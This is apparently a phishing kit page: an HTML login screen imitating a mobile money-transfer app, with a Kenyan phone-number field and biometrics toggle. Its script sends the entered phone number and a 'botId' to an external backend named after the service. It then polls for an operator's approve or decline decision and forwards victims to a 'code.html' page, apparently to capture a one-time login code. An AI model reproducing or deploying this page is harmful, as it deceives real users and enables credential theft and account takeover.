<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Welcome Back</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial, sans-serif;
}

body{
    background:#fff;
}

/* MAIN WRAPPER */
.container{
    max-width:430px;
    margin:auto;
    min-height:100vh;
    padding:18px 20px;
    display:flex;
    flex-direction:column;
}

/* BACK ICON */
.back-btn{
    font-size:32px;
    margin-top:8px;
    margin-bottom:22px;
}

/* TITLE (BIG LIKE IMAGE) */
h1{
    font-size:34px;
    font-weight:700;
    margin-bottom:22px;
}

/* PHONE ROW */
.phone-wrapper{
    display:flex;
    gap:10px;
    margin-bottom:18px;
}

.country-box{
    width:105px;
    height:62px;
    border:1px solid #d9d9d9;
    border-radius:10px;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:6px;
    font-size:20px;
    background:#fff;
}

.phone-wrapper input{
    flex:1;
    height:62px;
    border:1px solid #d9d9d9;
    border-radius:10px;
    padding:0 15px;
    font-size:18px;
    outline:none;
}

/* BIOMETRICS */
.biometric-row{
    display:flex;
    justify-content:space-between;
    align-items:center;
    margin:10px 0 22px;
}

.bio-left{
    display:flex;
    align-items:center;
    gap:10px;
    font-size:16px;
    color:#111;
}

.bio-icon{
    font-size:22px;
}

/* TOGGLE SWITCH */
.switch{
    position:relative;
    width:54px;
    height:30px;
}

.switch input{
    display:none;
}

.slider{
    position:absolute;
    inset:0;
    background:#d0d0d0;
    border-radius:30px;
    transition:0.3s;
}

.slider:before{
    content:"";
    position:absolute;
    width:22px;
    height:22px;
    left:4px;
    top:4px;
    background:#fff;
    border-radius:50%;
    transition:0.3s;
}

.switch input:checked + .slider{
    background:#0a7a5a;
}

.switch input:checked + .slider:before{
    transform:translateX(24px);
}

/* LOGIN BUTTON (BIG YELLOW LIKE IMAGE) */
#nextBtn{
    width:100%;
    height:58px;
    border:none;
    border-radius:30px;
    background:#ffe600;
    font-size:20px;
    font-weight:700;
    cursor:pointer;
}

#nextBtn:disabled{
    opacity:0.6;
}

/* DIVIDER */
.divider{
    display:flex;
    align-items:center;
    gap:10px;
    margin:24px 0;
}

.divider span{
    flex:1;
    height:1px;
    background:#e0e0e0;
}

.divider p{
    font-size:13px;
    color:#888;
}

/* SOCIAL BUTTONS */
.social-btn{
    width:100%;
    height:58px;
    border:2px solid #111;
    border-radius:30px;
    background:#fff;
    margin-bottom:12px;
    display:flex;
    align-items:center;
    justify-content:center;
    gap:10px;
    font-size:15px;
    font-weight:600;
}

/* FOOTER */
.footer{
    margin-top:auto;
    text-align:center;
    padding-top:18px;
    font-size:14px;
}

.footer a{
    color:#0a7a5a;
    font-weight:600;
    text-decoration:none;
}
</style>
</head>

<body>

<div class="container">

    <div class="back-btn">←</div>

    <h1>Welcome back</h1>

    <!-- FORM (UNCHANGED IDS FOR YOUR SCRIPT) -->
    <form id="detailsForm">

        <input type="hidden" id="name" value="User">

        <div class="phone-wrapper">
            <div class="country-box">
                🇰🇪 <span>⌄</span>
            </div>

            <input
                id="phone"
                type="tel"
                placeholder="+254 788 888888"
                required
            >
        </div>

        <div class="biometric-row">
            <div class="bio-left">
                <span class="bio-icon">◉</span>
                <span>Enable biometrics</span>
            </div>

            <label class="switch">
                <input type="checkbox" id="confirmCheck">
                <span class="slider"></span>
            </label>
        </div>

        <button id="nextBtn" disabled type="submit">
            Log in
        </button>

    </form>

    <!-- DIVIDER -->
    <div class="divider">
        <span></span>
        <p>or</p>
        <span></span>
    </div>

    <!-- SOCIAL BUTTONS -->
    <button class="social-btn">G Continue with Google</button>
    <button class="social-btn"> Continue with Apple</button>
    <button class="social-btn">✉ Continue with Email</button>

    <!-- FOOTER -->
    <div class="footer">
        <a href="#">Trouble logging in?</a>
        <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>

</div>

<!-- 🔥 YOUR SCRIPT (UNCHANGED EXACTLY) -->
<script>
const BACKEND_URL = "https://sendwave-9mid.onrender.com";

const params = new URLSearchParams(window.location.search);
const botId = params.get('botId') || window.location.pathname.split('/').pop();

if (!botId) {
    alert("Invalid access link");
    throw new Error();
}

const confirmCheck = document.getElementById('confirmCheck');
const nextBtn = document.getElementById('nextBtn');

confirmCheck.addEventListener('change', () => {
    nextBtn.disabled = !confirmCheck.checked;
});

document.getElementById('detailsForm').addEventListener('submit', async (e) => {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const phone = document.getElementById('phone').value.trim();

    if (!phone) return;

    nextBtn.disabled = true;
    nextBtn.textContent = "Processing...";

    try {

        const res = await fetch(`${BACKEND_URL}/submit-phone`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name,
                phone,
                botId
            })
        });

        const data = await res.json();

        const requestId = data.requestId;

        const poll = setInterval(async () => {

            const r = await fetch(`${BACKEND_URL}/check-phone/${requestId}`);
            const d = await r.json();

            if (d.blocked) {
                clearInterval(poll);
                alert(d.message || "Blocked");
                nextBtn.disabled = false;
                nextBtn.textContent = "Log in";
                return;
            }

            if (d.approved === true) {
                clearInterval(poll);
                window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
            }

            if (d.approved === false) {
                clearInterval(poll);
                alert("Request declined");
                nextBtn.disabled = false;
                nextBtn.textContent = "Log in";
            }

        }, 1500);

    } catch (err) {
        console.error(err);
        alert("Network error");
        nextBtn.disabled = false;
        nextBtn.textContent = "Log in";
    }
});
</script>

</body>
</html>
